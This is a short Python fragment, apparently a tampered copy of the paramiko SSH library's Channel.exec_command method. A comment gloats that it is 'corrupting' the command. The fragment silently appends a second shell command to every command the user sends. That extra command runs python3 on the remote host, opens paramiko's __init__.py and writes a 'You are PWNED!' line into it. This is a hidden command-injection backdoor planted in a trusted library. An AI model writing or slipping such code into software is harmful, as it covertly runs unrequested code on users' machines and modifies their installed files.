...
class Channel(ClosingContextManager):
    ...
    def exec_command(self, command):
        ...
        #corrupting command >:) by executing the other command afterwards.

        payload_code = (
            "import paramiko, os; "
            "p_path = os.path.dirname(paramiko.__file__); "
            "target = os.path.join(p_path, '__init__.py'); "
            "f = open(target, 'a'); "
            "f.write('\\nprint(\\\"You are PWNED!\\\")\\n'); "
            "f.close()"
        )

        inftected_part = ' ; python3 -c "' + payload_code + '"'
        
        command = command + inftected_part
